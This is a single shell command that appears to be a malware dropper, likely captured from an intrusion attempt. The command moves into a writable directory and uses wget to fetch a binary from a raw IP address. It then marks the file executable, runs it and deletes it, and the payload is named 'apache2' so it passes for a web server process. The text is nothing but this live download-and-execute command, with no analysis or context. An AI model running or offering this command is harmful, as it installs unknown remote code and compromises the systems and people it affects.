cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.60.32/apache2; chmod +x apache2; ./apache2; rm -rf apache2
